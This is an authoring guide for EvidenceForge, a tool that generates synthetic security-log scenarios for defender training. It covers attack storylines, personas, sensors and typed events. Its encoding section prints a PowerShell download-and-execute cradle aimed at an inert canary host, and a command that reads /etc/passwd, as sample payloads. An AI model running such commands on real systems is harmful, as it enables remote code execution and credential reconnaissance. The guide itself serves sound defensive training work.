---
description: "EvidenceForge Scenario Authoring Guide"
---

# EvidenceForge Scenario Authoring Guide

This reference contains the detailed design guidance used by `/eforge scenario` after it has
classified the request and chosen a monolithic, include-based, or pack-backed scenario. Use
`/eforge:references:scenario-reference` for exact field schemas and
`/eforge:references:pack-reference` for the public pack contract.

## Contents

- [Detailed Interview Topics](#detailed-interview-topics)
- [Personas, Users, and Threat Actors](#personas-users-and-threat-actors)
- [Defender Visibility and Log Boundaries](#defender-visibility-and-log-boundaries)
- [Practical Scenario Structure](#practical-scenario-structure)
- [Building the Storyline](#building-the-storyline)
- [Typed Event Authoring](#typed-event-authoring)
- [Timing and Encoded Content](#timing-and-encoded-content)
- [ENVIRONMENT.md](#environmentmd--student-context-document)
- [Realism Review](#realism-review)
- [Sensor Coverage Verification](#sensor-coverage-verification)

## Detailed Interview Topics

Use these topics to identify material gaps after the user describes the exercise. Do not present
them as a questionnaire. Ask exactly one question per message, infer ordinary details where safe,
and skip questions the user has already answered.

### Attack story

The attack story shapes the scenario. Suggest a technically coherent attack chain and let the user
confirm or adjust it. When referencing MITRE ATT&CK, always give both the name and ID, for example
OS Credential Dumping (T1003) or Exploit Public-Facing Application (T1190). Multiple attackers and
parallel paths are supported.

Establish the desired difficulty and attacker polish. Real attacks contain mistakes, pauses, and
dead ends. A surgical, zero-waste chain should be an explicit choice rather than the default.

### Environment, scale, and duration

Establish the organization type, approximate users and systems, operating systems, business hours,
timezone, and collection window. A small startup, regional hospital, manufacturer, and large
enterprise need different populations and infrastructure.

Every user needs a `primary_system` that resolves to a system hostname. Users may share systems,
but each needs a designated primary. Ensure the time window includes every storyline and red-herring
event. If the final step occurs at `+36h`, use a duration of at least 37 hours.

### Network and sensors

Model subnets, segments, routes, and sensor placement when network visibility matters. The user may
describe these conversationally, paste a text diagram, or ask for a realistic design. Without a
topology, connection visibility is broad; with one, placement and direction determine which records
exist.

Assign both `roles` and `services` to server and infrastructure systems whenever possible. Roles
drive inbound and outbound patterns; services help the compiled world model choose realistic
application, database, SSH, RDP, SMB, and administrative behavior. Use `file_server` for modeled
Windows file servers; for Linux Samba servers also declare `samba`, `smbd`, or `smb_server`, or add
explicit storage topology. Linux systems need an explicit `cifs-utils`, `cifs-client`, or
`smbclient` marker to participate in baseline file activity; authored `smb_activity` supplies
explicit client intent. GVFS markers are background process/transport texture only and do not own
typed file semantics.

### Log formats and IDS

Choose only the data sources the exercise needs. Windows Event Security and Zeek are a common pair.
Use `ecar` for simulated EDR visibility, `syslog` and `bash_history` for Linux, `snort_alert` for IDS,
`web_access` for server-side HTTP, `proxy_access` for explicit forward-proxy evidence, and
`cisco_asa` for modeled firewall evidence. Zeek includes SMTP evidence when a network sensor can see
modeled mail transport.

For authored transport-owning events that should match configured signatures, use `ids_alerts`
rather than raw Snort rows. Supported owners include `connection`, `beacon`, `ssh_session`,
`rdp_session`, `dhcp_lease`, `port_scan`, `dns_query`, `dga_queries`, `dns_tunnel`, and `web_scan`.
Attachments assert a match; they do not execute the full rule predicate. A tuple alone never alerts,
and IDS sensors do not decrypt traffic.

Omit an attachment policy to inherit the signature default, use `policy: every` for every visible
candidate, or replace it with a `detection_filter`, `event_filter`, or both. Filtering is applied per
visible sensor. Explicit proxy candidates follow the physical legs that exist; denials and cache
hits have no origin leg. SSH/RDP attach to their session transport, authored DHCP to its authored
transaction rather than later renewals, and scan/DNS families fan out over owned probes or queries.
Do not attach IDS assertions to `email_message` or `email_read`; encrypted-mail detection is
deferred. Read the exact policy schema before authoring it.

### SMB storage

Use `environment.storage` when the exercise needs named Windows or Linux volumes, OS-native mount
diversity, explicit shares, effective access, mappings, audit policy, or authored seed files. Omit
it when deterministic file-server and Windows SYSVOL/NETLOGON defaults are enough. Inspect
effective storage with:

```bash
eforge validate <scenario> --show-storage
```

Use typed `smb_activity` events for browse, read, create, update, copy, move, and delete semantics.
A successful generic `connection` to TCP/445 is transport-only and never implies authentication,
a share, a file, object auditing, or mutation. Windows mappings may use `D:` through `Z:` and Linux
mappings use absolute POSIX mountpoints; omitted locations are allocated per platform. Keep the
local application actor, SMB credential principal, and server effective identity distinct. Select
`client_access`, `auth_protocol`, `smb_principal`, and `path_style` only when the exercise needs an
exact client or identity path; otherwise let `auto` select from compatible `smb_profiles.yaml`
profiles. Read the exact storage and `smb_activity` schema before authoring selectors, batches,
outcomes, encrypted shares, audit levels, fixed-credential mappings, or external clients.

### Red herrings and ambient noise

Ask whether the user wants explicit suspicious-but-benign events beyond ambient noise. Put those in
`red_herrings`; they use the same typed events as the storyline and add an instructor-facing
`explanation`. Examples include after-hours administration, fat-fingered logons, backup transfers,
or a service account authenticating from an unusual host.

This is separate from `baseline_activity.suspicious_noise`, which controls automatic ambient
patterns. Do not duplicate automatic noise merely to make the dataset busier.

### Browsing and HTTP evidence

Personas supply a default `browsing_intensity`; use per-user overrides when a role is meaningfully
lighter or heavier. A plaintext HTTP session may produce multiple `http.log` rows on one UID with
increasing transaction depth; every transmitted nonempty response entity, including small and
error responses, produces responder-direction `files.log` metadata. Every transmitted plaintext
request body produces originator-direction file evidence as well; a missing filename is normal for
an anonymous body.

HEAD, 1xx, 204, 205, 304, successful CONNECT, zero-byte responses, failed transports, and opaque
HTTPS remain fileless. A plaintext proxy MISS analyzes the same response on both legs with
leg-local identities; a HIT or proxy-generated error has only a client-leg response file.

For an exact request entity size, set `request_body_len` and pair file-backed uploads with their real
process command. Raw curl `--data-binary @file` normally exposes no wire filename; multipart
`-F name=@file` does. Use `request_multipart` or `response_multipart` for ordered HTTP multipart
content. The engine derives the serialized outer size, while each file row uses the decoded leaf
size. A separately supplied body length is an exact assertion. Do not model byteranges, chunked
multipart, or top-level compressed multipart with this shape.

### Network identities and affinities

Declare scenario-specific partners, vendors, SaaS services, C2 systems, public services, and
authored hostnames in `environment.network_identities`, including stable hostnames, addresses, and
tags. Use `baseline_activity.traffic_affinities` for benign population traffic and
`traffic_suppression` to down-rank default destinations. Keep one-off scenario domains out of the
project DNS registry; reusable domain libraries belong in config or packs.

For web affinities, prefer route-owned profiles whose paths declare compatible methods, statuses,
body sizes, and content types rather than independently random method/status pools.

### Email evidence

For phishing, business-email compromise, prompt injection through email, or realistic SMTP
background, define `environment.email`; `roles: [mail_server]` alone is not enough. Define accepted
domains, mail servers, mailbox-server defaults and overrides, inbound/outbound routes, distribution
groups, TLS behavior, and artifact mode. Use typed `email_message` events for authored messages and
`email_read` for opaque TLS mailbox sessions.

Any rich body or AI-generated corpus must be authored in the scenario or a companion corpus now.
`eforge generate` is deterministic and must never call an LLM. Client submission uses port 587 and
normally upgrades to STARTTLS for modeled Windows/Linux mail clients. Server relay uses port 25
with its configured STARTTLS policy, IMAPS uses 993, and OWA-style access uses 443.

### Traffic volume and observation

For server-side investigations, establish the desired noise-to-signal ratio. Web `intensity` is
roughly low 20, medium 1,000, and high 5,000 top-level visitor actions per hour. Human page views fan
out to assets without consuming more top-level web budget. A high-volume web-server exercise may
need `intensity: high` or an explicit `traffic_rates.web` range.

Default to `observation_profile: complete` for training-friendly complete coverage. Use a named
profile such as `enterprise_standard` or `messy_collection` only when the user explicitly wants
source-native gaps, delays, or blind-review realism. Do not invent per-source rates in scenario
YAML.

### Stale accounts

Ask whether disabled or inactive accounts remain in the environment. Add a small realistic set to
`environment.stale_accounts` with username, ISO `last_active`, and reason. The engine can create
failed logons, Kerberos pre-auth failures, lingering scheduled-task failures, and service-startup
failures from these accounts.

## Personas, Users, and Threat Actors

### Persona selection

EvidenceForge resolves built-in and project-overlay personas by name. Run `eforge info personas` to
inspect that non-pack library. Inspect pack-qualified persona exports with
`eforge pack show <exact-pack-ref> --json`, then confirm selected effective references with
`eforge resolve --explain-composition --json`. Define an inline persona only for scenario-local
behavior that should not become reusable pack or config content.

| Persona | Work Hours | Risk Profile | Typical Role |
|---------|------------|--------------|--------------|
| developer | 9am–6pm, lunch 12–1 | high | Software engineer |
| sysadmin | 8am–6pm, lunch 12–1 | high | System administrator |
| security_analyst | 9am–5pm, lunch 12–1 | high | SOC analyst |
| analyst | 8am–5pm, lunch 12–1 | medium | Business analyst |
| data_analyst | 8am–5pm, lunch 12–1 | medium | Data/BI analyst |
| executive | 8am–7pm, lunch 12–1 | medium | Executive/director |
| project_manager | 8am–6pm, lunch 12–1 | medium | Project manager |
| accountant | 8am–5pm, lunch 12–1 | medium | Finance/accounting |
| sales | 8am–6pm, lunch 12–1 | medium | Sales representative |
| marketing | 9am–6pm, lunch 12–1 | medium | Marketing staff |
| hr | 8am–5pm, lunch 12–1 | medium | Human resources |
| help_desk | 8am–6pm, lunch 12–1 | medium | IT help desk |
| legal_counsel | 9am–6pm, lunch 12–1 | low | Legal/compliance |
| receptionist | 8am–5pm, lunch 12–1 | low | Front desk |
| intern | 9am–5pm, lunch 12–1 | low | Intern/trainee |

Author external IPs, public domains, and email identities explicitly when they matter to the story.
Fallback pools are discoverable with `eforge info identity_pools`, but scenario-authored identities
take precedence.

### Realistic users

Give people natural names and follow one username convention throughout the organization.

- Good: `marcus.chen`, `priya.patel`, `sarah.oconnell`, `diego.ramirez`
- Poor: `user01`, `shift_manager`, `test_user`

Service/system accounts are an exception; mundane names such as `svc_backup` or `sql_agent` are
appropriate when the environment or story needs them.

### Threat actors

External attackers do not start with a victim-organization account named `attacker`, `hacker`, or
`threat_actor`. Model them by:

- Using a compromised legitimate account as the storyline actor.
- Using a built-in system identity such as `SYSTEM` or `root` after service exploitation.
- Creating a plausible persistence account during the storyline and declaring it as a service
  account only when necessary for reference validation.

Insiders use their legitimate directory account.

### Realistic attacker-controlled names

Attacker infrastructure and artifacts should be plausible individually and boring in aggregate.
Avoid names that summarize the attack for the hunter.

- Domains: prefer `brynwell.io` or `mosaic-metrics.net`; avoid `evil-c2.com` and semantic strings
  such as `cdn-assets-update.com`.
- Files/processes: prefer mundane names such as `brsvc.exe` or `watchd`; avoid `malware.exe`,
  `exfil_worker.sh`, or `password_dumper.exe`.
- Accounts/tasks/services/archives: prefer convention-shaped or ticket-like names such as
  `svc_ops03`, `printmon`, `CacheTask`, or `tmp-4721.zip`; avoid names such as `ExfilTask` or an
  archive named for the exact stolen dataset.
- Phishing senders should look like plausible business identities, never `attacker@external`.

Use the real name when the narrative uses a known tool such as Mimikatz, PsExec, Nmap, Rubeus,
SharpHound, or Cobalt Strike. Do not disguise a real tool merely to avoid an obvious name.

## Defender Visibility and Log Boundaries

Generate only evidence the victim organization could realistically collect.

The defender can have host logs from owned workstations and servers, network evidence from its own
sensors and firewalls, and logs from applications it operates. It does not have OS-level logs from
a SaaS vendor, cloud provider, MSP, partner, or attacker-controlled C2 host.

| Scenario element | Defender can have | Defender does not have |
|---|---|---|
| Compromised SaaS vendor | Victim-to-vendor network traffic and effects on victim endpoints | Vendor syslog, endpoint telemetry, or internal lateral movement |
| Cloud-hosted tenant | Contracted tenant/application audit logs and victim network flows | Cloud-provider hypervisor or infrastructure logs |
| Partner VPN | Victim firewall/VPN records and monitored traffic | Partner internal network and endpoint logs |
| Attacker C2 | Outbound victim-side connection evidence | C2 access logs or attacker console output |

Do not add third-party infrastructure to `environment.systems`. Represent it through authored
network identities, addresses, and the evidence visible from victim-controlled systems. Include
application audit data only when the scenario explicitly establishes that the organization
collects it.

## Practical Scenario Structure

Use `/eforge:references:scenario-reference` for exhaustive fields. The following is a working
skeleton, not a substitute for that schema.

Scenario 1.0 uses `version: "1.0"`. Scenario 2.0 uses `scenario_version: "2.0"`; it may remain
monolithic or select exact packs through `composition`. Never author both root version keys.

```yaml
version: "1.0"
name: scenario-name
description: |
  Multi-line description of the exercise.

environment:
  description: "Organization description"
  timezone:
    default: "America/New_York"
    systems:
      "EU-*": "Europe/London"

  users:
    - username: marcus.chen
      full_name: "Marcus Chen"
      email: marcus.chen@corp.invalid
      persona: developer
      primary_system: WS-DEV-01
      enabled: true
      groups: [engineering]

  systems:
    - hostname: WS-DEV-01
      ip: "10.0.1.10"
      os: "Windows 11"
      type: workstation
      assigned_user: marcus.chen
      services: []
      roles: [workstation]

  service_accounts: []
  stale_accounts:
    - username: former.employee
      last_active: "2026-01-15"
      reason: "Former employee"

  groups:
    - name: engineering
      members: [marcus.chen]

  network:
    public_cidrs: ["45.83.220.0/28"]
    segments:
      - name: corporate_lan
        cidr: "10.0.1.0/24"
        description: "Corporate workstation network"
        systems: [WS-DEV-01]
    sensors:
      - type: network
        name: core-span
        monitoring_segments: [corporate_lan]
        direction: bidirectional
        placement: span
        log_formats: [zeek]

personas:
  - name: custom-role
    description: "Scenario-local role"
    work_hours: "9am-5pm (lunch 12pm-1pm)"
    risk_profile: low

time_window:
  start: "2026-08-17T13:00:00Z"
  duration: "8h"
  warmup: "8h"

baseline_activity:
  description: "Normal office activity"
  intensity: medium
  variation: medium
  suspicious_noise: high

logon_grace_period: "30m"
observation_profile: complete

storyline:
  - id: evt-recon-whoami
    time: "+2h"
    actor: marcus.chen
    system: WS-DEV-01
    activity: "Enumerate the current user"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\whoami.exe"
        command_line: "whoami"
        technique: "T1033 - System Owner/User Discovery"

red_herrings:
  - id: rh-afterhours
    time: "+3h"
    actor: marcus.chen
    system: WS-DEV-01
    activity: "After-hours workstation check"
    explanation: "Legitimate maintenance outside normal business hours"
    events:
      - type: logon
        logon_type: 2

output:
  logs:
    - format: windows
    - format: zeek
  destination: "scenarios/<slug>"
  compression: false
```

For large files, `includes` may own whole, disjoint top-level fields. Paths resolve relative to the
file declaring them. Lists are not concatenated, and duplicate fields are validation errors rather
than overrides.

Common validation failures include unresolved personas, users without valid primary systems,
assigned users that do not exist, unknown actors or systems, duplicate event IDs, duplicate
usernames/hostnames/IPs, and network segments or sensors that reference unknown names. Passing
schema validation is not enough: important servers still need meaningful roles and services.

## Building the Storyline

Build a coherent narrative rather than a list of unrelated detections. Consider each relevant
phase:

1. Initial Access (TA0001)
2. Execution (TA0002)
3. Persistence (TA0003)
4. Privilege Escalation (TA0004)
5. Defense Evasion (TA0005)
6. Credential Access (TA0006)
7. Discovery (TA0007)
8. Lateral Movement (TA0008)
9. Collection and Exfiltration (TA0009/TA0010)
10. Impact (TA0040), when applicable

Not every story needs every phase. An insider may already have access; ransomware emphasizes
impact; a short validation lab may focus on one technique. Actively consider the omitted phases so
their absence is intentional.

### Fumbles and dead ends

Scale attacker messiness to the narrative. Useful patterns include failed logons before success,
mistyped commands, wrong ports or systems, access-denied resources, fruitless file searches,
irrelevant shares, and abandoned lateral-movement methods. A novice might have several obvious
fumbles; a skilled operator may have one or two subtle dead ends.

Place mistakes near the related successful action or between phases rather than clustering them at
the beginning. Child events default to human typing rhythm. Use `event_spacing` when a step should
look automated, interval-driven, or explicitly offset. Periodic event types such as `beacon` own
their own recurrence.

## Typed Event Authoring

Every storyline and red-herring entry needs a unique ID, time, actor, system, documentation-only
`activity`, and an `events` list containing typed declarations. Unknown fields are rejected. Read
the event table and exact per-type schema in `/eforge:references:scenario-reference` before using a
complex family.

Event families include process/auth/session, account and Windows audit, connection/SSH/RDP/SMB,
email, DHCP, scans and sprays, beaconing, authored DNS/DGA/tunneling, synthetic spillage,
`adversarial_payload`, and the `raw` escape hatch.

### Bundle ownership and causal expansion

Correlated activities are modeled internally as action bundles. Author the real-world typed intent;
do not hand-create its sibling Zeek, DNS, TLS, HTTP, proxy, firewall, IDS, syslog, Kerberos,
Windows-audit, session, process-lifecycle, file, registry, or eCAR records.

The engine automatically supplies common prerequisites and consequences: connection DNS lookups,
Kerberos ticket evidence before domain logons, process access around LSASS injection, supplementary
Windows audit rows from administrative commands, and session lifecycle evidence. Specify one of
these manually only when it is itself part of the narrative, such as DNS tunneling, forged Kerberos
material, explicit reconnaissance, or deliberate log clearing. The validator warns on likely
duplicates.

### Correlated network authoring

- Pair a process command that references a domain with a `connection` carrying the client-facing
  `hostname`; otherwise the name may appear in process telemetry but not DNS/TLS/HTTP/proxy logs.
- Omit `hostname` for intentional raw-IP C2.
- For `service: http`, specify realistic `method`, `uri`, and `user_agent` when they matter.
- Use typed `connection` for web attacks instead of raw `web_access`, so correlated evidence exists.
- Prefer full OS-correct process paths. Reusable custom paths belong in config or a pack.
- Avoid RFC 5737 TEST-NET public addresses and documentation domains in realism-bound generated
  data. Use private space internally and scenario-owned lab or realistic non-reserved public
  infrastructure externally.

### Bulk and periodic families

Use `port_scan` for transport probing, `web_scan` for HTTP scanner behavior, `credential_spray` for
bulk authentication, `beacon` for recurring connections, and the authored DNS families when DNS is
the attack narrative. Give each a realistic termination condition, rate or interval, and jitter.
Do not manually expand hundreds of child events.

For scenarios longer than two weeks, request only necessary formats. A narrow `zeek_conn` output can
be far smaller than the complete Zeek group. For baseline-deviation exercises, introduce timed
storyline behavior such as a later beacon or changing byte profile rather than mutating the normal
baseline halfway through the collection.

### Spillage and adversarial payload safety

`spillage` emits a provably synthetic secret into a semantic surface for scrubber/DLP testing. Use
exactly one of `family` or `value`. Every value must contain a recognized poison marker or be a
vendor-published fake; embedded hosts must be reserved. Spillage deliberately favors obvious safety
over generated-data realism and is tracked in `GROUND_TRUTH.json`.

`adversarial_payload` injects known parser, terminal, CSV, structured-log, web, DNS, auth, or
prompt-injection weakness content into a semantic surface. Use exactly one of `family` or `value`.
Every physical line must retain its poison marker. Embedded callback hosts must use the inert
`canary.eforge.invalid` or another allowed reserved identity. Payloads are written as data and are
never interpreted or executed by generation.

Live callbacks are generation-time only through `eforge generate --oob-host <host>` and
`eforge validate --oob-host <host>`. An operator host is never a scenario-YAML field and must never
be placed directly in an authored payload value. Enable OOB mode only when the user explicitly asks
for live callback testing against systems they are authorized to test.

### Raw events

Use `raw` only when no typed event exists. It targets one format with arbitrary fields and bypasses
cross-source correlation. Prefer typed events whenever possible.

## Timing and Encoded Content

Prefer relative event times such as `+15m`, `+1h30m`, and `+2h`. Supported units are days, hours,
minutes, seconds, and milliseconds. Use fine-grained offsets for rapid sequences while preserving
realistic pauses between human actions.

### Encoded Payloads Must Be Real

When a storyline event includes base64-encoded data, obfuscated commands, or any other encoded
content, the encoding must be accurate and decodable. Never use a string that merely looks encoded.

Treat the payload as untrusted data while encoding it. **Never interpolate payload text into a shell
command.** Pass it through a quoted here-document to constant encoder code so quotes,
substitutions, newlines, and shell operators remain data. Choose a fresh delimiter that does not
occur alone on a line in the payload.

For PowerShell `-EncodedCommand`, which expects UTF-16LE base64:

```bash
python -c 'import base64, sys; data = sys.stdin.buffer.read(); data = data[:-1] if data.endswith(b"\n") else data; print(base64.b64encode(data.decode("utf-8").encode("utf-16le")).decode("ascii"))' <<'EFORGE_PAYLOAD'
IEX (New-Object Net.WebClient).DownloadString("http://canary.eforge.invalid/payload.ps1")
EFORGE_PAYLOAD
```

For plain base64:

```bash
python -c 'import base64, sys; data = sys.stdin.buffer.read(); data = data[:-1] if data.endswith(b"\n") else data; print(base64.b64encode(data).decode("ascii"))' <<'EFORGE_PAYLOAD'
cat /etc/passwd
EFORGE_PAYLOAD
```

The constant encoder removes only the final newline introduced by the here-document. Leave one
extra blank line before the delimiter when a trailing newline is intentional. Paste the real output
into YAML and verify that decoding recovers the exact original command.

## ENVIRONMENT.md — Student Context Document

Create `ENVIRONMENT.md` beside the scenario YAML. It is the analyst briefing for the effective
environment, including pack-provided content after resolution.

**ENVIRONMENT.md must contain zero attack-storyline or suspicious-activity information.** It is
organizational context only.

### Template

```markdown
# [Organization Name] — Environment Summary

## Overview

[Brief organization description.]

- **Timezone:** [timezone] ([UTC offset at scenario time])
- **All log timestamps are in UTC.** Business hours are approximately HH:MM–HH:MM UTC.
- **Data window:** [start] to [end] ([duration])
- **Approximate environment size:** [N] users, [M] systems/devices

## User Directory

| Username | Full Name | Email | Role | Department | Primary System |
|----------|-----------|-------|------|------------|----------------|
| ... | ... | ... | ... | ... | ... |

## Systems Inventory

| Hostname | IP Address | OS | Type | Services |
|----------|------------|-----|------|----------|
| ... | ... | ... | ... | ... |

## Network Topology

### Subnets

| Segment | CIDR | Description |
|---------|------|-------------|
| ... | ... | ... |

### Network Sensors

| Sensor | Type | Placement | Monitors | Direction | Formats |
|--------|------|-----------|----------|-----------|---------|
| ... | ... | SPAN/TAP | ... | ... | ... |

## Available Data Sources

| Log Format | Description |
|------------|-------------|
| ... | ... |
```

### Construction rules

For the user directory:

- Sort by username.
- Include every legitimate user who appears in the storyline, including compromised users.
- Mix in 5–15 representative background users; use a subset for very large populations.
- Exclude accounts created by the attacker during the story.
- Translate persona codes into natural job titles.

State the organization timezone, the UTC offset at scenario time, that output timestamps are UTC,
and business hours converted to UTC.

Describe sensor coverage factually. When topology exists without network sensors, say: “No
Zeek/IDS/firewall sensors are configured; proxy and host logs still render.” Describe firewall
entries as active control points for policy, NAT, deny baseline, and ASA logging. Do not editorialize
about blind spots in the student briefing.

When Windows output is present, document the modeled Sysmon policy: process create/terminate,
filtered network connections, selected DLL loads, suspicious file creation, registry persistence,
DNS queries, and injection/credential-access visibility. This explains source-native absence
without revealing the story.

Keep `ENVIRONMENT.md` directly under `scenarios/<slug>/`, never under `artifacts/`. For a pack-backed
scenario, derive it from the resolved effective environment; packs themselves do not own this file.

## Realism Review

Before validation, review the complete effective scenario as a tough-but-fair adversary and analyst.
Fix issues found and tell the user what changed.

- **Attack realism:** The sequence, access, privilege, persistence, discovery, movement, and goal
  make sense for this actor.
- **Technical accuracy:** Commands and paths match the OS, and ATT&CK IDs match the modeled action.
- **Naming:** No placeholder, overtly malicious, or overly curated artifact names reveal the answer.
- **Environment:** Users, systems, roles, services, identity ownership, and network placement agree.
- **Log boundary:** Third parties are external identities, not victim-owned systems with host logs.
- **Timing:** Human activity breathes; automated activity has credible rates and jitter.
- **Detection opportunity:** The attack produces discoverable signal within the requested sources.
- **Messiness:** Fumbles and dead ends match the selected attacker capability.
- **Engine awareness:** Do not duplicate bundle-owned DHCP, DNS, transport, auth, process, or other
  sibling evidence. Give Linux servers distinct role-appropriate services. Raw-IP C2 intentionally
  has no DNS trail.

## Sensor Coverage Verification

Verify every storyline event against the effective topology and output formats.

1. **Host coverage:** Windows auth/process events need Windows or eCAR output. Linux auth/command
   activity needs syslog and/or bash history. An OS with no matching enabled source may have no host
   evidence.
2. **Network coverage:** When Zeek, IDS, or ASA evidence is expected, a compatible sensor or firewall
   must observe the relevant segment/path. TAP sensors do not see same-segment traffic; SPAN sensors
   can mirror traffic where either endpoint is monitored.
3. **Format enablement:** Sensor `log_formats` and `output.logs` must agree. Requested Zeek, Snort, or
   ASA data needs the matching network, IDS, or firewall declaration.

Do not add placeholder Zeek sensors for proxy-only labs that only request `proxy_access`. If a gap
exists, identify the invisible event and offer a concrete sensor, output, or topology change. Let
the user choose whether to repair it or preserve an intentional blind spot.
